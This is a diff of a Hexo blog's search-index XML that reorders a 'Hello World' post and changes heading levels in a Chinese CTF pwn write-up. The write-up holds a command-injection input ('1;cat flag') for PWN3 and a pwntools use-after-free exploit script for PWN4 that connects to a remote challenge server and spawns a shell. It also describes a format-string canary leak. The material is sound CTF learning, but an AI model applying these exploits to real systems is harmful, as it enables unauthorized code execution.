@@ -26,25 +26,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/03/24/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
-<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>CUMTCTF春季赛-PWN</title>
     <url>/2021/03/30/cumtctf/</url>
     <content><![CDATA[<h1 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> PWN1</h1>
@@ -56,7 +37,7 @@
 <p><img src="/2021/03/30/cumtctf/3.jpg" alt="img"></p>
 <p>拿到flag</p>
 <p><img src="/2021/03/30/cumtctf/4.jpg" alt="img"></p>
-<h2 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> Pwn2</h2>
+<h1 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> PWN2</h1>
 <p>先检查程序，发现程序开启了canary保护和堆栈不可执行</p>
 <p><img src="/2021/03/30/cumtctf/5.jpg" alt="img"></p>
 <p>然后查看程序，程序会先执行一个fmt（）函数，可以发现这里有一个格式字符串的漏洞，可以泄露canary值</p>
@@ -74,7 +55,7 @@
 <p><img src="/2021/03/30/cumtctf/11.jpg" alt="img"></p>
 <p>选择1，然后1;cat flag，即可拿到Flag</p>
 <p><img src="/2021/03/30/cumtctf/12.jpg" alt="img"></p>
-<h2 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> Pwn4</h2>
+<h1 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> PWN4</h1>
 <p>Ida打开程序，发现也是一个选择菜单</p>
 <p><img src="/2021/03/30/cumtctf/a1.jpg" alt="img"></p>
 <p>仔细观察每个选择，发现漏洞点在2.delete中，函数只是free了堆块，但是没有把指针置空，会造成uaf漏洞</p>
@@ -95,7 +76,7 @@
 <p><img src="/2021/03/30/cumtctf/clip_image022.jpg" alt="img"></p>
 <p>Payload脚本</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#!/usr/bin/env python</span><br><br>\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&quot;./pwn4&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10003</span>)<br><br>backdoor = <span class="hljs-number">0x0000000400BCE</span><br><br>\<span class="hljs-comment">#p = process(&quot;./pwn4&quot;)</span><br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;6666&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;7777&quot;</span>)<br><br>\<span class="hljs-comment">#删除index0</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>\<span class="hljs-comment">#删除index1</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为4的堆块，内容是后门函数</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(p32(backdoor))<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>\<span class="hljs-comment">#调用index0的print指针</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>p.interactive()<br><br> <br></code></pre></td></tr></table></figure>
-<h2 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> pwn5</h2>
+<h1 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> PWN5</h1>
 <p>用ida打开程序，也是一个让我们选择的程序，选项1是创建账号，2是展示，3是删除，4是添加memory，5选项是验证main_account+16的位置的值是否等于1953330531，然后getshell</p>
 <p><img src="/2021/03/30/cumtctf/clip_image024.jpg" alt="img"></p>
 <p><img src="/2021/03/30/cumtctf/clip_image026.jpg" alt="img"></p>
@@ -122,6 +103,25 @@
       <tags>
         <tag>PWN学习</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/03/24/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
+<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>HTTP协议学习</title>
